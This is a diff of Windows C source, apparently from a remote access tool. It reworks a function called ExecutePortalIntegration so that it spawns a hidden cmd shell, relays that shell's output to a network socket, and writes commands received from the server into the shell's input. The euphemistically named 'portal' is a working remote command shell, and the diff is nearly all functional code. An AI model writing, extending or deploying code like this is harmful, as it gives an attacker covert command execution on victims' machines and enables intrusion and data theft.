@@ -212,11 +212,28 @@ void ExecuteUploadFile(char *FileName,int FileSize, SOCKET Connection){
     }
 }
 
+WINAPI CALLBACK ReadFromProcess(void* Config){
+    struct ChildProcessConfigPackage *Configuration = (struct ChildProcessConfigPackage*) Config;
+    DWORD ProcessExitCode;
+    char TextFromAndToServer[INTEGRATION_BUFFER_SIZE] = {0};
+    DWORD BytesWrittenAndRead = 0;
 
-WINAPI CALLBACK InteractWithChildProcess(void* ChildConfig){
-    struct ChildProcessConfigPackage *Config = (struct ChildProcessConfigPackage*)ChildConfig;
+    while(1){
+        GetExitCodeProcess(*Configuration->ProcessHandler,&ProcessExitCode);
 
-    
+        if(ProcessExitCode == STILL_ACTIVE){
+            if(ReadFile(*Configuration->ChildStdoutReadHandle,TextFromAndToServer,INTEGRATION_BUFFER_SIZE - 1,&BytesWrittenAndRead,NULL) == FALSE){
+                break;
+            }
+            if(strcmp(TextFromAndToServer,"") != 0){
+                send(*Configuration->ClientSocket,TextFromAndToServer,BytesWrittenAndRead,0);
+                memset(TextFromAndToServer,0,INTEGRATION_BUFFER_SIZE);
+            }
+        }
+        else{
+            break;
+        }
+    }
 }
 
 void ExecutePortalIntegration(SOCKET Connection){
@@ -224,9 +241,13 @@ void ExecutePortalIntegration(SOCKET Connection){
     STARTUPINFO StartInfo;
     PROCESS_INFORMATION ProcInfo;
     SECURITY_ATTRIBUTES Sec;
+    char TextFromAndToServer[INTEGRATION_BUFFER_SIZE] = {0},*PortalOpenedMessage = "The portal was opened\n";
+    int ReadBytes = 0;
+    DWORD BytesWrittenAndRead = 0;
     DWORD ProcessExitCode;
     struct ChildProcessConfigPackage ChildConfig;
 
+    memset(&ChildConfig,0,sizeof(struct ChildProcessConfigPackage));
     memset(&StartInfo,0,sizeof(STARTUPINFO));
     memset(&ProcInfo,0,sizeof(PROCESS_INFORMATION));
     memset(&Sec,0,sizeof(SECURITY_ATTRIBUTES));
@@ -244,33 +265,55 @@ void ExecutePortalIntegration(SOCKET Connection){
     StartInfo.hStdError = ChildStdoutWriteHandler;
     StartInfo.dwFlags |= STARTF_USESTDHANDLES;
 
-    ChildConfig.ChildStdinRead = &ChildStdinReadHandler;
-    ChildConfig.ChildStdinWrite = &ChildStdinWriteHandler;
-    ChildConfig.ChildStdoutRead = &ChildStdoutReadHandler;
-    ChildConfig.ChildStdoutWrite = &ChildStdoutWriteHandler;
-
     CreateProcess(NULL, "cmd /q /k",NULL,NULL,TRUE,0,NULL,NULL,&StartInfo,&ProcInfo);
 
     ProcessHandler = OpenProcess(PROCESS_ALL_ACCESS,0,ProcInfo.dwProcessId);
 
-    ThreadHandler = CreateThread(NULL,0,InteractWithChildProcess,(void*)&ChildConfig,NULL,NULL);
+    ChildConfig.ChildStdoutReadHandle = &ChildStdoutReadHandler;
+    ChildConfig.ClientSocket = &Connection;
+    ChildConfig.ProcessHandler = &ProcessHandler;
+    ChildConfig.ReadProcessThreadFree = FALSE;
 
-    if(ThreadHandler == INVALID_HANDLE_VALUE){
-        //TODO!!!
-    }
+    Sleep(500);
 
-    while(TRUE){
+    send(Connection,PortalOpenedMessage,strlen(PortalOpenedMessage),0);
+
+
+    ThreadHandler = CreateThread(NULL,0,ReadFromProcess,(void*)&ChildConfig,0,NULL);
+
+    memset(TextFromAndToServer,0,INTEGRATION_BUFFER_SIZE);
+
+    while((ReadBytes = recv(Connection,TextFromAndToServer,INTEGRATION_BUFFER_SIZE - 2,0)) != SOCKET_ERROR){
+        strcat(TextFromAndToServer,"\n");
         GetExitCodeProcess(ProcessHandler,&ProcessExitCode);
-        if(ProcessExitCode != STILL_ACTIVE){
-            CloseHandle(ChildStdinReadHandler);
-            CloseHandle(ChildStdinWriteHandler);
-            CloseHandle(ChildStdoutReadHandler);
-            CloseHandle(ChildStdoutWriteHandler);
-            CloseHandle(ProcInfo.hProcess);
-            CloseHandle(ProcInfo.hThread);
+        if(ProcessExitCode == STILL_ACTIVE){
+            if(WriteFile(ChildStdinWriteHandler,TextFromAndToServer,ReadBytes + 1,&BytesWrittenAndRead,NULL) == FALSE){
+                break;
+            }
+        }
+        else{
             break;
         }
-        Sleep(1000);
+        
+        Sleep(500);
+        memset(TextFromAndToServer,0,INTEGRATION_BUFFER_SIZE);
+
+        GetExitCodeProcess(ProcessHandler,&ProcessExitCode);
+    
+        if(ProcessExitCode != STILL_ACTIVE){
+            break;
+        }
     }
 
+    Sleep(1000);
+    CancelSynchronousIo(ThreadHandler);
+
+    TerminateProcess(ProcessHandler,0);
+
+    CloseHandle(ChildStdinReadHandler);
+    CloseHandle(ChildStdinWriteHandler);
+    CloseHandle(ChildStdoutReadHandler);
+    CloseHandle(ChildStdoutWriteHandler);
+    CloseHandle(ProcInfo.hProcess);
+    CloseHandle(ProcInfo.hThread);
 }
